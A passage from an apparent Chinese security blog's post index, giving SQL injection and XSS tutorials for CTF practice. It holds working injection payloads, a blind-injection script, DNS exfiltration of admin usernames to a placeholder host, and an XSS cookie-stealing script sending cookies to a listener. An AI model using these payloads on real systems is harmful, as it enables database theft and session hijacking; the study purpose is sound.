class=\"line\">        try:</span><br><span class=\"line\">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class=\"line\">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class=\"line\">        except requests.exceptions.ReadTimeout:</span><br><span class=\"line\">            flag +&#x3D;j</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">#表</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class=\"line\">#列</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class=\"line\">#flag</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-基于报错的SQL盲注\"><a href=\"#3-基于报错的SQL盲注\" class=\"headerlink\" title=\"3.基于报错的SQL盲注\"></a>3.基于报错的SQL盲注</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">' and updataxml(1,concat(0x7e,(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>()),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>) <span class=\"comment\">--+   //查看用户</span></span><br><span class=\"line\"><span class=\"string\">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //查看数据库</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"keyword\">and</span> updataxml(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)<span class=\"comment\">--+    //查看数据库的名字</span></span><br><span class=\"line\"><span class=\"string\">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class=\"keyword\">test</span> <span class=\"string\">' limit 0,1),0x7e),1) --+     //查看各表的名字</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"keyword\">and</span> updatexml(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">'my student'</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>) <span class=\"comment\">--+   //查看列的名字</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"4-二次注入\"><a href=\"#4-二次注入\" class=\"headerlink\" title=\"4.二次注入\"></a>4.二次注入</h2><h3 id=\"0x01二次注入原理\"><a href=\"#0x01二次注入原理\" class=\"headerlink\" title=\"0x01二次注入原理\"></a>0x01二次注入原理</h3><p><strong>防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</strong></p>\n<ul>\n<li><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>\n</li>\n<li><p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>\n</li>\n</ul>\n<h2 id=\"5-DNS注入\"><a href=\"#5-DNS注入\" class=\"headerlink\" title=\"5.DNS注入\"></a>5.DNS注入</h2><h3 id=\"0x01DNS\"><a href=\"#0x01DNS\" class=\"headerlink\" title=\"0x01DNS\"></a>0x01DNS</h3><p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png\" alt=\"image-20200609202338069\"></p>\n<h3 id=\"0x02注入函数\"><a href=\"#0x02注入函数\" class=\"headerlink\" title=\"0x02注入函数\"></a>0x02注入函数</h3><p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png\" alt=\"image-20200609203639074\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;读取文件</span><br><span class=\"line\">select load_file(&quot;\\\\\\\\xxx.php90.cn\\\\ccc&quot;)      &#x2F;&#x2F;转义</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x03注入\"><a href=\"#0x03注入\" class=\"headerlink\" title=\"0x03注入\"></a>0x03注入</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;xxx.php90.cn\\\\cc&quot;));</span><br><span class=\"line\">select load_file(concat(&quot;\\\\\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\\\cc&quot;));</span><br><span class=\"line\">select load_file(concat(&quot;\\\\\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\\\cc&quot;));</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-报错注入\"><a href=\"#6-报错注入\" class=\"headerlink\" title=\"6.报错注入\"></a>6.报错注入</h2><p>更详细的解释<a href=\"https://xz.aliyun.com/t/253\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/253</a></p>\n<p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p>\n<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p>\n<h3 id=\"xpath语法错误\"><a href=\"#xpath语法错误\" class=\"headerlink\" title=\"xpath语法错误\"></a>xpath语法错误</h3><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5</p>\n<p><strong>extractvalue函数</strong></p>\n<blockquote>\n<p>函数原型：extractvalue(xml_document,Xpath_string)<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p>\n</blockquote>\n<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>\n<p>pyload：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p>\n<p>例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class=\"line\">12</span><br></pre></td></tr></table></figure>\n<p>针对mysql数据库：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class=\"line\">爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class=\"line\">爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class=\"line\">爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class=\"line\">1234</span><br></pre></td></tr></table></figure>\n<p>注：</p>\n<ul>\n<li>① 0x7e=’~’</li>\n<li>② concat(‘a’,‘b’)=“ab”</li>\n<li>③ version()=@@version</li>\n<li>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</li>\n<li>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li>\n</ul>\n<p><strong>updatexml</strong></p>\n<blockquote>\n<p>函数原型：updatexml(xml_document,xpath_string,new_value)<br>正常语法：updatexml(xml_document,xpath_string,new_value)<br>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p>\n</blockquote>\n<p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p>\n<p>例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class=\"line\">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class=\"line\">12</span><br></pre></td></tr></table></figure>\n<p>同样，针对mysql：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class=\"line\">爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class=\"line\">爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class=\"line\">爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure>\n<h3 id=\"concat-rand-group-by-导致主键重复\"><a href=\"#concat-rand-group-by-导致主键重复\" class=\"headerlink\" title=\"concat+rand()+group_by()导致主键重复\"></a>concat+rand()+group_by()导致主键重复</h3><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p>\n<p><strong>rand()：</strong></p>\n<blockquote>\n<p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p>\n</blockquote>\n<p><strong>floor()：</strong></p>\n<blockquote>\n<p>对任意正或者负的十进制值向下取整</p>\n</blockquote>\n<p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p>\n<p><strong>group by</strong></p>\n<blockquote>\n<p>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p>\n</blockquote>\n<p>报错的原因是因为<strong>rand()函数在查询的时候会执行一次,插入的时候还会执行一次.</strong>这就是整个语句报错的关键</p>\n<p>前面说过floor(rand(0)<em>2) 前六位是<em>*0110110</em></em></p>\n<p><strong>group by x先建立一个空表,用于分组.</strong>然后进行分组查询,第一次rand()执行,查询的结果是0,因为是空表所以插入这条,而插入的时候rand()又执行了一次,所以表中的结果就是</p>\n<p><a href=\"https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png\" target=\"_blank\" rel=\"noopener\"><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png\" alt=\"img\"></a></p>\n<p>第一次执行完,接着执行rand()的值为1,因为表中存在,所以加1,表中结果成为</p>\n<p><a href=\"https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png\" target=\"_blank\" rel=\"noopener\"><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png\" alt=\"img\"></a></p>\n<p>到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,<strong>这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了</strong></p>\n<p><strong>此时插入因为重复出现同一个key,就会出现报错 重复出现key.而报错中会说明那个key有问题,我们的key中结合了想要了解的字符串root@localhost</strong></p>\n<p><strong>这样就实现了报错注入,拿到了自己想要的数据</strong></p>\n<p><strong><a href=\"https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png\" target=\"_blank\" rel=\"noopener\"><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png\" alt=\"img\"></a></strong></p>\n<p>这就是整个报错注入的原理了,rand(),floor() group by 函数缺一不可.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#payload</span><br><span class=\"line\">1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>\n<p>看一下ctfhub报错注入</p>\n<h3 id=\"ctfhub报错注入\"><a href=\"#ctfhub报错注入\" class=\"headerlink\" title=\"ctfhub报错注入\"></a>ctfhub报错注入</h3><p>查表</p>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png\" alt=\"image-20200817145102761\"></p>\n<p>查flag</p>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png\" alt=\"image-20200817145552296\"></p>\n","categories":["web"],"tags":["web"]},{"title":"xss","url":"https://pz1o.top/2020/12/09/xss/","content":"<p>这篇更乱，也就那个小挑战还算完整</p>\n<h1 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h1><h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><h3 id=\"理解同步和异步：\"><a href=\"#理解同步和异步：\" class=\"headerlink\" title=\"理解同步和异步：\"></a>理解同步和异步：</h3><p>举个例子，比如有一个网页，html和php，php会延时执行。</p>\n<p>同步：只有当php执行完之后，才会显示html网页。</p>\n<p>异步：刷新之后，会立即显示html网页，之后再显示php执行的内容。</p>\n<h3 id=\"js设置cookie\"><a href=\"#js设置cookie\" class=\"headerlink\" title=\"js设置cookie\"></a>js设置cookie</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01存储xss\"><a href=\"#0x01存储xss\" class=\"headerlink\" title=\"0x01存储xss\"></a>0x01存储xss</h2><p>存储型xss主要是攻击者将xss代码插入到页面上，然后存在数据库里，当访问者访问这个页面时，就会导致xss代码执行。</p>\n<p>出现场景：编辑内容（xss代码）可以保存，并且可以再次访问这个内容。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x02反射xss\"><a href=\"#0x02反射xss\" class=\"headerlink\" title=\"0x02反射xss\"></a>0x02反射xss</h2><p>攻击者在url中插入xss代码，服务器将url中的xss代码输入到页面上，攻击者将xss代码的url发送给用户，用户打开后受到xss攻击。</p>\n<p>出现场景：url中可以传递参数</p>\n<p>通常来说，会闭合一些标签，从而执行代码。</p>\n<p>常用闭合</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;</span><br><span class=\"line\">&#39;&gt;</span><br><span class=\"line\">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure>\n<p>其实还是具体情况具体对待</p>\n<h2 id=\"0x03dom型xss\"><a href=\"#0x03dom型xss\" class=\"headerlink\" title=\"0x03dom型xss\"></a>0x03dom型xss</h2><p>攻击者在url中插入xss代码，前端页面直接从url中获取xss代码并且输入到页面，导致xss代码的执行，攻击者将带有xss代码的url发送给用户，用户打开后受到xss攻击</p>\n<p>关于反射型和dom型差别：</p>\n<p>前端处理是dom，后端处理是反射</p>\n<h1 id=\"常用修复函数\"><a href=\"#常用修复函数\" class=\"headerlink\" title=\"常用修复函数\"></a>常用修复函数</h1><p>strip_tags：过滤html标签</p>\n<p>htmlspecialchars：将html标签转换为实体</p>\n<h1 id=\"常用的payload\"><a href=\"#常用的payload\" class=\"headerlink\" title=\"常用的payload\"></a>常用的payload</h1><h2 id=\"标签\"><a href=\"#标签\" class=\"headerlink\" title=\"标签\"></a>标签</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"x\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">eval(</span>\"<span class=\"attr\">alert</span>('<span class=\"attr\">xss</span>')\")&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:alert('xss')\"</span>&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">javascript:eval(alert(</span>'<span class=\"attr\">xss</span>'))&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:aaa\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">\"alert(/xss/)\"</span>&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">需要用编码绕过时：</span><br><span class=\"line\">Base64：<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class=\"line\"></span><br><span class=\"line\">urlencode：<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class=\"line\"></span><br><span class=\"line\">HTML实体编码 ：<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">eval(alert(</span>'<span class=\"attr\">xss</span>'))&gt;</span>bb<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">prompt(</span>'<span class=\"attr\">xss</span>')&gt;</span>cc<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:text/html,<span class=\"symbol\">&amp;lt;</span>script<span class=\"symbol\">&amp;gt;</span>alert('xss')<span class=\"symbol\">&amp;lt;</span>/script<span class=\"symbol\">&amp;gt;</span>\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"aaa\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>') /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"javascript<span class=\"symbol\">&amp;colon;</span>prompt<span class=\"symbol\">&amp;lpar;</span>`xss`<span class=\"symbol\">&amp;rpar;</span>\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>') <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">prompt(</span>'<span class=\"attr\">xss</span>') <span class=\"attr\">bad</span>=<span class=\"string\">\"\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">value</span>=<span class=\"string\">1</span> <span class=\"attr\">type</span>=<span class=\"string\">image</span> <span class=\"attr\">src</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie盗取：</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"keyword\">var</span> img=<span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"img\"</span>);img.src=<span class=\"string\">\"http://xxx.xxx.xxx.xxx:1234/a?\"</span>+<span class=\"built_in\">escape</span>(<span class=\"built_in\">document</span>.cookie);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">nc监听端口1234</span><br></pre></td></tr></table></figure>\n<h1 id=\"xss编码\"><a href=\"#xss编码\" class=\"headerlink\" title=\"xss编码\"></a>xss编码</h1><h2 id=\"js编码\"><a href=\"#js编码\" class=\"headerlink\" title=\"js编码\"></a>js编码</h2><p>JS提供了四种字符编码的策略，</p>\n<ul>\n<li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\\141</code></li>\n<li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\\x61</code></li>\n<li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\\u0061</code></li>\n<li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\\n</code>和<code>\\r</code></li>\n</ul>\n<h2 id=\"HTML实体编码\"><a href=\"#HTML实体编码\" class=\"headerlink\" title=\"HTML实体编码\"></a>HTML实体编码</h2><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>\n<p><strong>字符编码</strong></p>\n<p>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p>\n<p>如<code>&lt;</code>的编码为</p>\n<p><code>&lt;</code>(10进制)&amp;#60</p>\n<p><code>&lt;</code>(16进制)&amp;#x003c</p>\n<p><strong>URL编码</strong></p>\n<p>这里为url全编码，也就是两次url编码</p>\n<p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>\n<p><strong>String.fromCharCode编码</strong></p>\n<p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>\n<h1 id=\"xss挑战题\"><a href=\"#xss挑战题\" class=\"headerlink\" title=\"xss挑战题\"></a>xss挑战题</h1><p>做任何题都可以测试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure>\n<p>做一下xss题</p>\n<h2 id=\"level1\"><a href=\"#level1\" class=\"headerlink\" title=\"level1\"></a>level1</h2><p><img src=\"/2020/12/09/xss/image-20200821200652133.png\" alt=\"image-20200821200652133\"></p>\n<p>可以发现test在h2标签处，直接写就可以只需要弹窗，就可以进入下一关</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p><img src=\"/2020/12/09/xss/image-20200821201141420.png\" alt=\"image-20200821201141420\"></p>\n<p><img src=\"/2020/12/09/xss/image-20200821201207838.png\" alt=\"image-20200821201207838\"></p>\n<p>对比可以发现，值直接在value处，所以<strong>只需要闭合标签即可</strong></p>\n<p><strong>搜索框里直接写</strong></p>\n<figure class=\"highlight 